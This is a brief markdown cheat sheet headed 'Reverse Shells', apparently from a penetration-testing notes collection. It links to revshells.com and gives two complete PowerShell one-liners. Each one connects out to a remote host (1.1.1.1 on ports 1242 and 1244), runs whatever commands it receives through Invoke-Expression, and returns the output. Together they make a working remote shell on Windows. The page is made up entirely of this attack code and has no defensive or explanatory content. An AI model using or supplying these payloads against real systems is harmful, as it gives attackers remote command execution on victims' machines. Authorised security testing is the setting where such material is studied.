# Reverse Shells

- [Revshells](https://www.revshells.com/)

## Powershell

```powershell
$LHOST = "1.1.1.1"; $LPORT = 1242; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

```powershell
$socket = New-Object System.Net.Sockets.TCPClient('1.1.1.1',1244); if($socket -eq $null){exit 1}; $stream = $socket.GetStream(); $reader = New-Object System.IO.StreamReader($stream); $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush=$true; $prompt = 'PS ' + $(Get-Location) + '> '; $writer.Write($prompt); while($true){ $data = $reader.ReadLine(); $output = ''; try{ $output = Invoke-Expression $data 2>&1 | Out-String }catch{ $output = $_ }; $writer.Write($output + $prompt) }
```